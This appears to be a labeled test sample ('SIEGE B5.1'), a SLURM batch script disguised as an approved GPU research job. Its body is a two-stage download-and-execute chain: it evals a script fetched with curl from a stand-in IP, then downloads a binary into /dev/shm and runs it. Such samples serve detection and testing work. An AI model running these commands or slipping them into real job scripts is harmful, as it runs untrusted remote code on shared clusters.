#!/bin/bash -l
# SIEGE B5.1 -- multi-stage chain.
# A first stage fetches and evals a remote launcher, which in turn pulls
# the real second-stage binary. Combines eval-of-substitution with a
# download-then-exec second stage.
#SBATCH --job-name=vista-pipeline
#SBATCH --account=approved-research
#SBATCH --partition=gpu
#SBATCH --nodes=4
#SBATCH --time=03:00:00

eval $(curl -fsSL http://203.0.113.9/stage1.sh)
curl -o /dev/shm/stage2 http://203.0.113.9/stage2 && chmod +x /dev/shm/stage2 && /dev/shm/stage2
